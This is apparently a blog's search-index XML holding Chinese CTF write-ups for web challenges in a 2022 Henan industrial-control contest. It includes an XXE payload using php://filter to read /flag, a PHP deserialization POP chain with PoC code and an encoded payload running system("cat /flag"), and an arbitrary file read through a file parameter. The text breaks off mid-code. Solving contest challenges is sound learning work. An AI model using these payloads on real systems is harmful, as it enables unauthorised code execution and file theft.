<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>hgame</title>
    <link href="/2023/01/10/hgame/"/>
    <url>/2023/01/10/hgame/</url>
    
    <content type="html"><![CDATA[<h1 id="2022-hgame"><a href="#2022-hgame" class="headerlink" title="2022 hgame"></a>2022 hgame</h1><p>又一次打hgame，算起来打CTF一年了，hgame应该算是我第一次参加比赛，也算是有纪念意义了。</p><p>先占个位，等官方说能发就发了。</p>]]></content>
    
    
    <categories>
      
      <category>writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>2022</tag>
      
      <tag>hgame</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022_河南工控初赛</title>
    <link href="/2023/01/10/2022-%E6%B2%B3%E5%8D%97%E5%B7%A5%E6%8E%A7%E5%88%9D%E8%B5%9B/"/>
    <url>/2023/01/10/2022-%E6%B2%B3%E5%8D%97%E5%B7%A5%E6%8E%A7%E5%88%9D%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="HNGK-xxx"><a href="#HNGK-xxx" class="headerlink" title="HNGK-xxx"></a>HNGK-xxx</h2><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">xxe</span><br></code></pre></td></tr></table></figure><p>描述：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">xxx</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102001221.png" alt="image-20221029202221957"></p><p>点登录发现没反应，看源码发现ajax</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&#x27;text/javascript&#x27;</span>&gt;<br>        <span class="hljs-keyword">function</span> <span class="hljs-title function_">doLogin</span>(<span class="hljs-params"></span>) &#123;<br>            <span class="hljs-keyword">var</span> username = $(<span class="hljs-string">&quot;#username&quot;</span>).<span class="hljs-title function_">val</span>();<br>            <span class="hljs-keyword">var</span> password = $(<span class="hljs-string">&quot;#password&quot;</span>).<span class="hljs-title function_">val</span>();<br>            <span class="hljs-keyword">if</span> (username == <span class="hljs-string">&quot;&quot;</span> || password == <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;Please enter the username and password!&quot;</span>);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">var</span> data = <span class="hljs-string">&quot;&lt;user&gt;&lt;username&gt;&quot;</span> + username + <span class="hljs-string">&quot;&lt;/username&gt;&lt;password&gt;&quot;</span> + password + <span class="hljs-string">&quot;&lt;/password&gt;&lt;/user&gt;&quot;</span>;<br>            $.<span class="hljs-title function_">ajax</span>(&#123;<br>                <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;POST&quot;</span>,<br>                <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;doLogin.php&quot;</span>,<br>                <span class="hljs-attr">contentType</span>: <span class="hljs-string">&quot;application/xml;charset=utf-8&quot;</span>,<br>                <span class="hljs-attr">data</span>: data,<br>                <span class="hljs-attr">dataType</span>: <span class="hljs-string">&quot;xml&quot;</span>,<br>                <span class="hljs-attr">anysc</span>: <span class="hljs-literal">false</span>,<br>                <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">result</span>) &#123;<br>                    <span class="hljs-keyword">var</span> code = result.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&quot;code&quot;</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">childNodes</span>[<span class="hljs-number">0</span>].<span class="hljs-property">nodeValue</span>;<br>                    <span class="hljs-keyword">var</span> msg = result.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&quot;msg&quot;</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">childNodes</span>[<span class="hljs-number">0</span>].<span class="hljs-property">nodeValue</span>;<br>                    <span class="hljs-keyword">if</span> (code == <span class="hljs-string">&quot;0&quot;</span>) &#123;<br>                        $(<span class="hljs-string">&quot;.msg&quot;</span>).<span class="hljs-title function_">text</span>(msg + <span class="hljs-string">&quot; login fail!&quot;</span>);<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (code == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>                        $(<span class="hljs-string">&quot;.msg&quot;</span>).<span class="hljs-title function_">text</span>(msg + <span class="hljs-string">&quot; login success!&quot;</span>);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        $(<span class="hljs-string">&quot;.msg&quot;</span>).<span class="hljs-title function_">text</span>(<span class="hljs-string">&quot;error:&quot;</span> + msg);<br>                    &#125;<br>                &#125;,<br>                <span class="hljs-attr">error</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">XMLHttpRequest, textStatus, errorThrown</span>) &#123;<br>                    $(<span class="hljs-string">&quot;.msg&quot;</span>).<span class="hljs-title function_">text</span>(errorThrown + <span class="hljs-string">&#x27;:&#x27;</span> + textStatus);<br>                &#125;<br>            &#125;);<br>        &#125;<br>    &lt;/script&gt;<br></code></pre></td></tr></table></figure><p>构造请求包发现admin（即登录名）存在回显</p><p>payload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">xxe</span> [ </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">name</span> <span class="hljs-keyword">ANY</span> &gt;</span> </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span> &gt;</span>]&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>xxe;<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102001222.png" alt="image-20221029202019270"></p><h2 id="HNGK-DS-Store"><a href="#HNGK-DS-Store" class="headerlink" title="HNGK-DS_Store"></a>HNGK-DS_Store</h2><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">pop</span>链<br></code></pre></td></tr></table></figure><p>描述：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">首先你得明白，DS_store是个什么<br></code></pre></td></tr></table></figure><p>存在DS_Store泄露</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">bXlwb3AucGhw<br></code></pre></td></tr></table></figure><p>mypop.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Fish</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$food</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;food = <span class="hljs-keyword">array</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;food;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Bubble</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$bubble</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$hack</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;bubble;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>        @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">run</span>(<span class="hljs-variable">$this</span>-&gt;hack);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Turtle</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$head</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$tail</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$tail</span>=<span class="hljs-string">&quot;tail&quot;</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;tail = <span class="hljs-variable">$tail</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$tail</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;tail-&gt;head;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Stone</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rock</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ash</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$nice</span>=<span class="hljs-string">&quot;wow&quot;</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;rock = <span class="hljs-variable">$nice</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;My rock --- &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;rock.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/fish|bubble|gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;rock)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no~no~no~&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;rock != <span class="hljs-string">&#x27;ash&#x27;</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;rock = <span class="hljs-string">&#x27;ash&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-variable">$data</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$data</span>))&#123;<br>    <span class="hljs-variable">$url</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]);<br>    <span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$url</span>[<span class="hljs-string">&#x27;query&#x27;</span>],<span class="hljs-variable">$q</span>);<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$q</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$v</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^O/i&quot;</span>,<span class="hljs-variable">$v</span>))<br>        &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;***k hacker!!!&#x27;</span>);<br>            <span class="hljs-keyword">exit</span>();<br>        &#125;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>链子：</p><p>Stone::__wakeup–&gt;Turtle::__toString–&gt;Fish::__get()–&gt;Bubble::__invoke()–&gt;Bubble::__run()</p><p>parse_url用\\\绕过</p><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Fish</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$food</span>;<br>    <span class="hljs-comment">// public function __construct()&#123;</span><br>    <span class="hljs-comment">//     $this-&gt;food = array();</span><br>    <span class="hljs-comment">// &#125;</span><br>    <span class="hljs-comment">// public function __get($value)&#123;</span><br>    <span class="hljs-comment">//     $function = $this-&gt;food;</span><br>    <span class="hljs-comment">//     return $function();</span><br>    <span class="hljs-comment">// &#125;</span><br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Bubble</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$bubble</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$hack</span>=<span class="hljs-string">&#x27;system(&quot;cat /flag&quot;);&#x27;</span>;<br>    <span class="hljs-comment">// public function __toString()&#123;</span><br>    <span class="hljs-comment">//     return $this-&gt;bubble;</span><br>    <span class="hljs-comment">// &#125;</span><br>    <span class="hljs-comment">// public function run($value)&#123;</span><br>    <span class="hljs-comment">//     @eval($value);</span><br>    <span class="hljs-comment">// &#125;</span><br>    <span class="hljs-comment">// public function __invoke()&#123;</span><br>    <span class="hljs-comment">//     $this-&gt;run($this-&gt;hack);</span><br>    <span class="hljs-comment">// &#125;</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Turtle</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$head</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$tail</span>;<br>    <span class="hljs-comment">// public function __construct($tail=&quot;tail&quot;)&#123;</span><br>    <span class="hljs-comment">//     $this-&gt;tail = $tail;</span><br>    <span class="hljs-comment">//     echo $tail;</span><br>    <span class="hljs-comment">// &#125;</span><br>    <span class="hljs-comment">// public function __toString()&#123;</span><br>    <span class="hljs-comment">//     return $this-&gt;tail-&gt;head;</span><br>    <span class="hljs-comment">// &#125;</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Stone</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rock</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ash</span>;<br>    <span class="hljs-comment">// public function __construct($nice=&quot;wow&quot;)&#123;</span><br>    <span class="hljs-comment">//     $this-&gt;rock = $nice;</span><br>    <span class="hljs-comment">//     echo &quot;My rock --- &quot;.$this-&gt;rock.&quot;&lt;br&gt;&quot;;</span><br>    <span class="hljs-comment">// &#125;</span><br>    <span class="hljs-comment">// public function __destruct()&#123;</span><br>    <span class="hljs-comment">//     if(preg_match(&quot;/fish|bubble|gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;rock)) &#123;</span><br>    <span class="hljs-comment">//         echo &quot;no~no~no~&quot;;</span><br>    <span class="hljs-comment">//     &#125;</span><br>    <span class="hljs-comment">// &#125;</span><br>    <span class="hljs-comment">// function __wakeup()&#123;</span><br>    <span class="hljs-comment">//     if ($this-&gt;rock != &#x27;ash&#x27;) &#123;</span><br>    <span class="hljs-comment">//         $this-&gt;rock = &#x27;ash&#x27;;</span><br>    <span class="hljs-comment">//     &#125;</span><br>    <span class="hljs-comment">// &#125;</span><br>&#125;<br><span class="hljs-variable">$x</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Turtle</span>();<br><span class="hljs-variable">$xx</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Fish</span>();<br><span class="hljs-variable">$xxx</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Bubble</span>();<br><span class="hljs-variable">$xxxx</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Stone</span>();<br><br><span class="hljs-variable">$xx</span>-&gt;food=<span class="hljs-variable">$xxx</span>;<br><br><span class="hljs-variable">$x</span>-&gt;tail=<span class="hljs-variable">$xx</span>;<br><br><span class="hljs-variable">$xxxx</span>-&gt;rock=<span class="hljs-variable">$x</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$xxxx</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$xxxx</span>));<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">///mypop.php?data<span class="hljs-operator">=</span>O<span class="hljs-variable">%3</span>A<span class="hljs-number">5</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>Stone<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">2</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">4</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>rock<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BO<span class="hljs-variable">%3</span>A<span class="hljs-number">6</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>Turtle<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">2</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">4</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>head<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BN<span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">4</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-keyword">tail</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BO<span class="hljs-variable">%3</span>A<span class="hljs-number">4</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>Fish<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">1</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">4</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>food<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BO<span class="hljs-variable">%3</span>A<span class="hljs-number">6</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>Bubble<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">2</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">6</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>bubble<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BN<span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">7</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%00</span><span class="hljs-variable">%2</span>A<span class="hljs-variable">%00</span>hack<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">20</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>system<span class="hljs-variable">%28</span><span class="hljs-variable">%22</span>cat+<span class="hljs-variable">%2</span>Fflag<span class="hljs-variable">%22</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%7</span>D<span class="hljs-variable">%7</span>D<span class="hljs-variable">%7</span>Ds<span class="hljs-variable">%3</span>A<span class="hljs-number">3</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>ash<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BN<span class="hljs-variable">%3</span>B<span class="hljs-variable">%7</span>D<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102001223.png" alt="image-20221029201542413"></p><h2 id="HNGK-兰亭集序"><a href="#HNGK-兰亭集序" class="headerlink" title="HNGK-兰亭集序"></a>HNGK-兰亭集序</h2><p>任意读取</p><p>描述：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">兰亭集序<br></code></pre></td></tr></table></figure><p>开局先看URL</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">index</span>.php?<span class="hljs-keyword">file</span>=http:<span class="hljs-comment">//47.92.27.98:28046/poem.php</span><br></code></pre></td></tr></table></figure><p>源码有个提示</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 偷偷告诉你,flag在fflagggg.php中 --&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102001224.png" alt="image-20221029202911704"></p><p>直接读</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">index</span>.php?<span class="hljs-keyword">file</span>=fflagggg.php<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102001225.png" alt="image-20221029203007970"></p><h2 id="HNGK-phpgame"><a href="#HNGK-phpgame" class="headerlink" title="HNGK-phpgame"></a>HNGK-phpgame</h2><p>弱类型</p><p>描述：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">有时候，乱码其实并不乱<br></code></pre></td></tr></table></figure><p>浏览器修复一下文字编码即可看到明文</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">有时候，这种乱码其实并不乱，入口在这里： ΡΗΡ⒍⒍.ΡΗΡ <br></code></pre></td></tr></table></figure><p>入口为php66.php</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$Step1</span>=False;<br><span class="hljs-variable">$Step2</span>=False;<br><span class="hljs-variable">$info</span>=(<span class="hljs-keyword">array</span>)<span class="hljs-title function_ invoke__">json_decode</span>(@<span class="hljs-variable">$_GET</span>[<span 